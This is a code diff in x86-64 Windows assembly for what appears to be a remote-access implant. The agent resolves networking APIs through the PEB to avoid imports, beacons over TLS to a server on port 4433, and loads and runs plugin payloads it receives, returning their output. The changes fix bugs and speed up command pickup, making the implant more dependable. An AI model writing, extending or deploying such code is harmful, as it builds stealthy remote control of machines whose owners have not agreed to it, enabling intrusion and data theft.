@@ -164,6 +164,7 @@ server_port             equ 4433
 
 ; --- Heartbeat interval (ms) ---
 heartbeat_interval_ms   dd 30000
+recv_timeout_val        dd 1000        ; SO_RCVTIMEO optval (must not live on the stack; see set_recv_timeout)
 
 ; --- Winsock function names (for PEB-based dynamic resolution) ---
 str_WSAStartup:     db "WSAStartup", 0
@@ -174,6 +175,7 @@ str_recv:           db "recv", 0
 str_closesocket:    db "closesocket", 0
 str_WSAGetLastError: db "WSAGetLastError", 0
 str_ioctlsocket:    db "ioctlsocket", 0
+str_setsockopt:     db "setsockopt", 0
 str_ws2_32:         db "ws2_32.dll", 0
 
 ; --- Schannel/SSPI function names ---
@@ -248,6 +250,7 @@ sandbox_code_size:  resq 1          ; Size of allocated sandbox code
 pipe_buffer:        resb MAX_AGENT_PAYLOAD  ; Buffer for sandbox stdin/stdout data
 pipe_bytes_read:    resd 1          ; Bytes read from sandbox stdout
 pipe_bytes_written: resd 1          ; Bytes written to sandbox stdin
+pipe_resp_total:    resd 1          ; Total sandbox response length (survives recv_exact scratch use)
 
 ; --- Resolved ws2_32 function pointers ---
 ptr_WSAStartup:     resq 1
@@ -258,6 +261,7 @@ ptr_recv:           resq 1
 ptr_closesocket:    resq 1
 ptr_WSAGetLastError: resq 1
 ptr_ioctlsocket:    resq 1
+ptr_setsockopt:     resq 1
 
 ; --- Receive frame state ---
 recv_header_buf:    resb HEADER_SIZE
@@ -390,15 +394,24 @@ _start:
 %endif
 
 ; ===========================================================================
-; Set socket to non-blocking mode for command reception
+; Cap blocking recv with SO_RCVTIMEO: idle waits park in the kernel, so an
+; incoming command wakes the agent within ~1 s instead of after the old
+; nonblocking + 30 s sleep cycle that made every idle command wait ~15 s.
+; NOTE: the optval dword lives in .data, NOT on the stack — ws2_32!setsockopt
+; homes r9 into the caller's [rsp+24] (the arg-4 home slot), which clobbers
+; a stack-resident option value before the callee dereferences it.
 ; ===========================================================================
-set_nonblocking:
+RECV_TIMEOUT_MS    equ 1000
+
+set_recv_timeout:
     sub rsp, 40
-    mov dword [rsp + 32], 1
+    mov dword [recv_timeout_val], RECV_TIMEOUT_MS
     mov rcx, [sock_fd]
-    mov edx, 0x8004667E
-    lea r8, [rsp + 32]
-    call [ptr_ioctlsocket]
+    mov edx, 0xFFFF                         ; SOL_SOCKET
+    mov r8d, 0x1006                         ; SO_RCVTIMEO
+    lea r9, [recv_timeout_val]
+    mov dword [rsp + 32], 4                 ; optlen (5th stack arg)
+    call [ptr_setsockopt]
     add rsp, 40
     ret
 
@@ -411,7 +424,7 @@ main_loop:
     sub rsp, 56
     mov dword [send_fail_count], 0
 
-    call set_nonblocking
+    call set_recv_timeout
 
 .loop:
     call send_heartbeat
@@ -435,10 +448,20 @@ main_loop:
     test eax, eax
     jz .no_data
     cmp eax, 2
-    jne .process
+    je .auth_fail
+    cmp eax, 3
+    je .frame_too_big
+    jmp .process
+.auth_fail:
     ; authentication failure: report and drop the frame
     mov rcx, .auth_msg
     mov edx, .auth_msg_len
+    call send_exception
+    jmp .try_recv
+.frame_too_big:
+    ; oversized frame was consumed and dropped: report and keep the stream
+    mov rcx, .toobig_msg
+    mov edx, .toobig_msg_len
     call send_exception
     jmp .try_recv
 .process:
@@ -446,8 +469,9 @@ main_loop:
     jmp .try_recv
 
 .no_data:
-    mov ecx, [heartbeat_interval_ms]
-    call Sleep
+    ; The refill loop already parks ~25 s per recv_command pass (25 x 1 s
+    ; SO_RCVTIMEO blocks), which keeps the heartbeat cadence near 30 s;
+    ; no extra sleep here — it would only delay command pickup.
     jmp .loop
 
 .fatal:
@@ -465,6 +489,9 @@ main_loop:
 
 .auth_msg: db "frame_authentication_failed", 0
 .auth_msg_len equ $ - .auth_msg
+; 21 chars + NUL = 22: distinct from every other exception length
+.toobig_msg: db "gateway-frame-too-big", 0
+.toobig_msg_len equ $ - .toobig_msg
 
 ; ===========================================================================
 ; resolve_sspi_functions: Load secur32.dll and resolve SSPI functions
@@ -641,7 +668,7 @@ tls_recv:                           ; rcx = out, edx = requested -> min(availabl
     ; can be momentarily empty MID-FRAME — poll briefly instead of failing,
     ; so a frame spanning TCP segments completes in one recv pass and
     ; heartbeat ACKs never interleave into a partially-read frame
-    mov r12d, 200                   ; 200 x 10ms = 2s mid-frame grace
+    mov r12d, 25                    ; 25 x 1s SO_RCVTIMEO parks = ~25s idle grace
 .pr_refill:
     mov eax, [tls_decrypted_len]
     cmp eax, 32768
@@ -2152,6 +2179,14 @@ resolve_ws2_functions:
     jz .rw2_fail
     mov [ptr_ioctlsocket], rax
 
+    lea rdx, [str_setsockopt]
+    mov r8d, 10
+    mov rcx, [rsp]
+    call find_export
+    test rax, rax
+    jz .rw2_fail
+    mov [ptr_setsockopt], rax
+
     mov eax, 1
     add rsp, 40
     ret
@@ -2474,7 +2509,7 @@ recv_command:
 
     mov eax, [recv_frame_payload_len]
     cmp eax, MAX_AGENT_PAYLOAD
-    ja .rc_nodata
+    ja .rc_too_big
 
     ; heartbeat with empty body: gateway fast path, nothing follows
     cmp word [recv_frame_type], FEI_TYPE_HEARTBEAT
@@ -2542,6 +2577,47 @@ recv_command:
     add rsp, 72
     ret
 
+.rc_too_big:
+    ; Well-formed but oversized frame: consume and discard its whole body
+    ; (ciphertext + tag + padding) so the stream resyncs. Rolling back like
+    ; .rc_nodata would leave the staging parser staring at the same oversized
+    ; header forever, silently dropping every command after the first one.
+    push rbx
+    push r12
+    mov r12d, [recv_frame_payload_len]
+    add r12d, AEAD_TAG_SIZE
+    movzx eax, word [recv_padding_len]
+    add r12d, eax
+.discard_loop:
+    test r12d, r12d
+    jz .discard_done
+    mov edx, r12d
+    cmp edx, 4096
+    jbe .discard_read
+    mov edx, 4096
+.discard_read:
+    mov ebx, edx                ; chunk size survives the call in rbx
+    lea rcx, [recv_body_buf]
+    call tls_recv_exact
+    test eax, eax
+    jz .discard_fail            ; stream broke mid-frame
+    sub r12d, ebx
+    jmp .discard_loop
+.discard_done:
+    mov eax, 3                  ; new code: frame dropped, stream advanced
+    pop r12
+    pop rbx
+    add rsp, 72
+    ret
+.discard_fail:
+    mov eax, [recv_saved_off]
+    mov [tls_decrypted_off], eax
+    xor eax, eax
+    pop r12
+    pop rbx
+    add rsp, 72
+    ret
+
 ; ===========================================================================
 ; process_command: dispatch an authenticated, decrypted frame.
 ; plugin_load (0x02) payload is the sandbox pipe frame [cmd u8][len u32][data];
@@ -2581,35 +2657,87 @@ process_command:
     mov edx, 4
     call sandbox_recv_exact
     test eax, eax
-    jz .pc_sandbox_err
+    jz .pc_recv_hdr_err
 
     mov eax, [recv_plaintext_buf]
     cmp eax, MAX_AGENT_PAYLOAD
-    ja .pc_sandbox_err
+    ja .pc_resp_big_err
     test eax, eax
     jz .pc_done
-    mov [pipe_bytes_read], eax
+    ; sandbox_recv_exact uses pipe_bytes_read as Peek/Read scratch: the last
+    ; chunk count would clobber the total, so keep the total separately.
+    mov [pipe_resp_total], eax
 
     lea rcx, [pipe_buffer]
     mov edx, eax
     call sandbox_recv_exact
     test eax, eax
-    jz .pc_sandbox_err
+    jz .pc_recv_body_err
 
-    mov edx, [pipe_bytes_read]
+    mov edx, [pipe_resp_total]
     lea rcx, [pipe_buffer]
     call send_exec_return
     jmp .pc_done
 
+; Four failure stages, four distinct message lengths (14/18/19/17 with NUL)
+; so the exception frame length alone identifies the failing stage.
 .pc_send_err:
     mov rcx, .send_err_msg
     mov edx, .send_err_msg_len
     call send_exception
     jmp .pc_done
 
-.pc_sandbox_err:
-    mov rcx, .pc_err_msg
-    mov edx, .pc_err_msg_len
+.pc_recv_hdr_err:
+    mov rcx, .recv_hdr_err_msg
+    mov edx, .recv_hdr_err_msg_len
+    call send_exception
+    jmp .pc_done
+
+.pc_recv_body_err:
+    mov rcx, .recv_body_err_msg
+    mov edx, .recv_body_err_msg_len
+    call send_exception
+    jmp .pc_done
+
+.pc_resp_big_err:
+    ; The sandbox response exceeds the relay budget. Its bytes are already
+    ; in (or coming down) the pipe: DRAIN the declared amount so the next
+    ; command's length prefix is not read from stale response data (the
+    ; un-drained leftover used to poison every later command).
+    push rbx
+    push r12
+    mov r12d, eax                ; declared response length
+.pr_drain:
+    test r12d, r12d
+    jz .pr_drain_done
+    mov edx, r12d
+    cmp edx, 4096
+    jbe .pr_drain_read
+    mov edx, 4096
+.pr_drain_read:
+    mov ebx, edx
+    lea rcx, [pipe_buffer]
+    call sandbox_recv_exact
+    test eax, eax
+    jz .pr_drain_stuck           ; pipe broke or sandbox died mid-drain
+    sub r12d, ebx
+    jmp .pr_drain
+.pr_drain_done:
+    pop r12
+    pop rbx
+    mov rcx, .resp_big_err_msg
+    mov edx, .resp_big_err_msg_len
+    call send_exception
+    jmp .pc_done
+.pr_drain_stuck:
+    pop r12
+    pop rbx
+    mov rcx, .resp_big_err_msg
+    mov edx, .resp_big_err_msg_len
+    call send_exception
+    jmp .pc_done
+    mov rcx, .resp_big_err_msg
+    mov edx, .resp_big_err_msg_len
     call send_exception
     jmp .pc_done
 
@@ -2622,11 +2750,15 @@ process_command:
     add rsp, 56
     ret
 
-; Error message for sandbox failure
-.pc_err_msg: db "sandbox_recv_failed", 0
-.pc_err_msg_len equ $ - .pc_err_msg
-.send_err_msg: db "sandbox_send_failed", 0
+; Error messages for sandbox pipe failures (distinct lengths, see above)
+.send_err_msg: db "sbx-send-fail", 0
 .send_err_msg_len equ $ - .send_err_msg
+.recv_hdr_err_msg: db "sbx-recv-hdr-fail", 0
+.recv_hdr_err_msg_len equ $ - .recv_hdr_err_msg
+.recv_body_err_msg: db "sbx-recv-body-fail", 0
+.recv_body_err_msg_len equ $ - .recv_body_err_msg
+.resp_big_err_msg: db "sbx-resp-too-big", 0
+.resp_big_err_msg_len equ $ - .resp_big_err_msg
 
 ; ===========================================================================
 ; Data: sandbox configuration
@@ -2764,6 +2896,13 @@ sandbox_send:
 .send_loop:
     test rbx, rbx
     jz .success
+
+    ; rcx is volatile across the call: reload the handle every iteration.
+    ; The old pre-loop-only copy was clobbered by the previous WriteFile, so
+    ; every multi-chunk (>4096-byte) write failed with an invalid handle.
+    mov rcx, [pipe_stdin_write]
+    test rcx, rcx
+    jz .fail
 
     ; Calculate bytes to write (min of remaining, 4096)
     mov r8, rbx
